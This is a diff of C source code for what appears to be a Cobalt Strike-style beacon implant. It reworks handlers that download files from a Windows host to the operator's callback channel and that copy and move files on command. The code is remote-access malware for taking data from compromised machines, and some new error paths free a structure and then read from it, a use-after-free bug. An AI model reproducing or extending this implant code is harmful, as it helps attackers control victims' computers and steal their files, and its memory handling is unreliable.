+    size_t msgLen = strlen(prefix) + fileNameBufLen;
 
-    DataProcess(resultStr, msgLen, 0);
+    postMsg[msgLen] = '\0';
+
+    DataProcess(postMsg, msgLen, CALLBACK_OUTPUT);
 
     free(args->fileNameBuf);
     free(args);
-    free(fileBuffer);
+    CloseHandle(hFile);
 
     return TRUE;
 }
 
 VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
     struct FileThreadArgs* args = (struct FileThreadArgs*)malloc(sizeof(struct FileThreadArgs));
-    if (args == NULL) {
+    if (!args) {
         fprintf(stderr, "Memory allocation failed\n");
         return;
     }
 
-    args->fileNameBuf = (unsigned char*)malloc(commandBuflen + 1);
-    if (args->fileNameBuf) {
-        memcpy(args->fileNameBuf, commandBuf, commandBuflen);
-        args->fileNameBuf[commandBuflen] = '\0';
+    args->fileNameBuf = (char*)malloc(commandBuflen + 1);
+    if (!args->fileNameBuf) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(args);
+        return;
+    }
+    datap parser;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
 
-        args->fileNameBufLen = commandBuflen;
+    memcpy(args->fileNameBuf, BeaconDataPtr(&parser, commandBuflen), commandBuflen);
+    args->fileNameBuf[commandBuflen] = '\0';
+    args->fileNameBufLen = commandBuflen;
+
+    DWORD attributes = INVALID_FILE_ATTRIBUTES;
+    if (args->fileNameBuf) {
+        attributes = GetFileAttributesA((LPCSTR)args->fileNameBuf);
     }
 
-    DWORD attributes = GetFileAttributesA((LPCSTR)args->fileNameBuf);
-
+    // error
     if (attributes == INVALID_FILE_ATTRIBUTES) {
-        const char* errorMsg = "[-] GetFileAttributesA failed: Invalid path or file";
-        unsigned char* errorStr = (unsigned char*)malloc(strlen(errorMsg) + 1);
-        if (errorStr) {
-            memcpy(errorStr, errorMsg, strlen(errorMsg));
-            *msgLen = strlen(errorMsg);
-			errorStr[strlen(errorMsg)] = '\0';
-            DataProcess(errorStr, strlen(errorMsg), 0);
-        }
+        fprintf(stderr, "GetFileAttributesA failed with error:%lu\n", GetLastError());
+        free(args);
+        free(args->fileNameBuf);
+        return;
     }
 
     // 目录
     if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
         fprintf(stderr, "Unable to download directory\n");
+        free(args);
+        free(args->fileNameBuf);
         return;
     }
 
     HANDLE myThread = CreateThread(
         NULL,                       // 默认线程安全性
         0,                          // 默认堆栈大小
-        myThreadFunction,           // 线程函数
+        downloadThread,           // 线程函数
         args,                       // 传递给线程函数的参数
         0,                          // 默认创建标志
         NULL);                      // 不存储线程ID
 
     if (myThread == NULL) {
-        fprintf(stderr, "CreateThread Failed With Error: %lu\n", GetLastError());
-        return NULL;
+        fprintf(stderr, "CreateThread failed with error: %lu\n\n", GetLastError());
+        free(args);
+        free(args->fileNameBuf);
+        return;
     }
 
     CloseHandle(myThread);
 }
 unsigned char* CmdFileCopy(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
-    // 数据包格式：existingFileNameBigEndian(4Bytes) | existingFileName(existingFileNameBigEndian Bytes) | newFileNameLength(4Bytes) | newFileName(newFileNameLength Bytes)
-    uint8_t existingFileNameLength[4];
-    memcpy(existingFileNameLength, commandBuf, 4);
-    uint32_t existingFileNameBigEndian = bigEndianUint32(existingFileNameLength);
+    // 数据包格式：existingFileNameLength(4 Bytes) | existingFileName(existingFileName Bytes) | newFileNameLength(4 Bytes) | newFileName(newFileNameLength Bytes)
+    datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
+    char* existingFileName = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
+    char* newFileName = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);
 
-    uint8_t newFileNameLength[4];
-    memcpy(newFileNameLength, commandBuf + 4 + existingFileNameBigEndian, 4);
-    uint32_t newFileNameBigEndian = bigEndianUint32(newFileNameLength);
-
-    unsigned char* existingFileName = malloc(existingFileNameBigEndian + 1);
-    if (!existingFileName) {
-        fprintf(stderr, "Memory allocation failed\n");
-        return NULL;
-    }
-    memcpy(existingFileName, commandBuf + 4, existingFileNameBigEndian);
-    existingFileName[existingFileNameBigEndian] = '\0';
-
-    unsigned char* newFileName = malloc(newFileNameBigEndian + 1);
-    if (!newFileName) {
-        fprintf(stderr, "Memory allocation failed\n");
-        free(existingFileName);
-        return NULL;
-    }
-    memcpy(newFileName, commandBuf + 4 + existingFileNameBigEndian + 4, newFileNameBigEndian);
-    newFileName[newFileNameBigEndian] = '\0';
+    datap parser;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
+    BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);
 
     if (!CopyFileA(existingFileName, newFileName, FALSE))
     {
-		fprintf(stderr, "CopyFileA Failed With Error:%lu\n", GetLastError());
-        free(existingFileName);
-        free(newFileName);
+        fprintf(stderr, "CopyFileA failed with error:%lu\n", GetLastError());
+        BeaconDataFree(pdatap);
         return NULL;
     }
 
-	unsigned char* copyStr = "[+] Copy Success:";
-    size_t postMsgLen = strlen(copyStr) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
-	unsigned char* postMsg = (unsigned char*)malloc(postMsgLen);
-	snprintf(postMsg, postMsgLen, "%s%s -> %s", copyStr, existingFileName, newFileName);
+	const char* prefix = "[*] Copy file success: ";
+    size_t totalLength = strlen(prefix) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
+	unsigned char* postMsg = (unsigned char*)malloc(totalLength);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        BeaconDataFree(pdatap);
+        return NULL;
+    }
+    memcpy(postMsg, prefix, strlen(prefix));
+    memcpy(postMsg + strlen(prefix), existingFileName, strlen(existingFileName));
+    memcpy(postMsg + strlen(prefix) + strlen(existingFileName), " -> ", strlen(" -> "));
+    memcpy(postMsg + strlen(prefix) + strlen(existingFileName) + strlen(" -> "), newFileName, strlen(newFileName));
 
-	*msgLen = strlen((char*)postMsg);
+    postMsg[totalLength - 1] = '\0';
+	*msgLen = totalLength - 1;
 
-    free(existingFileName);
-    free(newFileName);
+    BeaconDataFree(pdatap);
+
     return postMsg;
 }
 
 unsigned char* CmdFileMove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
-    // 数据包格式：existingFileNameBigEndian(4Bytes) | existingFileName(existingFileNameBigEndian Bytes) | newFileNameLength(4Bytes) | newFileName(newFileNameLength Bytes)
-    uint8_t existingFileNameLength[4];
-    memcpy(existingFileNameLength, commandBuf, 4);
-    uint32_t existingFileNameBigEndian = bigEndianUint32(existingFileNameLength);
+    // 数据包格式：existingFileNameLength(4 Bytes) | existingFileName(existingFileName Bytes) | newFileNameLength(4 Bytes) | newFileName(newFileNameLength Bytes)
+	datap* pdatap = BeaconDataAlloc(MAX_EXISTING_FILENAME + MAX_NEW_FILENAME);
+    char* existingFileName = BeaconDataPtr(pdatap, MAX_EXISTING_FILENAME);
+    char* newFileName = BeaconDataPtr(pdatap, MAX_NEW_FILENAME);
 
-    uint8_t newFileNameLength[4];
-    memcpy(newFileNameLength, commandBuf + 4 + existingFileNameBigEndian, 4);
-    uint32_t newFileNameBigEndian = bigEndianUint32(newFileNameLength);
-
-    unsigned char* existingFileName = malloc(existingFileNameBigEndian + 1);
-    if (!existingFileName) {
-        fprintf(stderr, "Memory allocation failed\n");
-        return NULL;
-    }
-    memcpy(existingFileName, commandBuf + 4, existingFileNameBigEndian);
-    existingFileName[existingFileNameBigEndian] = '\0';
-
-    unsigned char* newFileName = malloc(newFileNameBigEndian + 1);
-    if (!newFileName) {
-        fprintf(stderr, "Memory allocation failed\n");
-        free(existingFileName);
-        return NULL;
-    }
-    memcpy(newFileName, commandBuf + 4 + existingFileNameBigEndian + 4, newFileNameBigEndian);
-    newFileName[newFileNameBigEndian] = '\0';
-
+    datap parser;
+    BeaconDataParse(&parser, commandBuf, commandBuflen);
+    BeaconDataStringCopySafe(&parser, existingFileName, MAX_EXISTING_FILENAME);
+    BeaconDataStringCopySafe(&parser, newFileName, MAX_NEW_FILENAME);
+    
     if (!MoveFileA(existingFileName, newFileName))
     {
-        fprintf(stderr, "MoveFileA Failed With Error:%lu\n", GetLastError());
-        free(existingFileName);
-        free(newFileName);
+        fprintf(stderr, "MoveFileA failed with error:%lu\n\n", GetLastError());
+		BeaconDataFree(pdatap);
         return NULL;
     }
 
-    unsigned char* copyStr = "[+] Move Success:";
-    size_t postMsgLen = strlen(copyStr) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
-    unsigned char* postMsg = (unsigned char*)malloc(postMsgLen);
-    snprintf(postMsg, postMsgLen, "%s%s -> %s", copyStr, existingFileName, newFileName);
-
-    if (postMsg) {
-        *msgLen = strlen((char*)postMsg);
+    const char* prefix = "[*] Move file success: ";
+    size_t totalLength = strlen(prefix) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
+    unsigned char* postMsg = (unsigned char*)malloc(totalLength);
+    if (!postMsg) {
+        fprintf(stderr, "Memory allocation failed\n");
+        BeaconDataFree(pdatap);
+        return NULL;
     }
+    memcpy(postMsg, prefix, strlen(prefix));
+    memcpy(postMsg + strlen(prefix), existingFileName, strlen(existingFileName));
+    memcpy(postMsg + strlen(prefix) + strlen(existingFileName), " -> ", strlen(" -> "));
+    memcpy(postMsg + strlen(prefix) + strlen(existingFileName) + strlen(" -> "), newFileName, strlen(newFileName));
 
-    free(existingFileName);
-    free(newFileName);
+	*msgLen = totalLength - 1;
+	postMsg[totalLength - 1] = '\0';
+
+	BeaconDataFree(pdatap);
+
     return postMsg;
 }
 
